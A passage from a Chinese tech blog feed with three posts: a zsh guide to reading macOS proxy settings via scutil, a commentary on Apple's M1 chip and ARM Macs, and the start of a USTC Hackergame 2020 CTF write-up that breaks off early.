macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 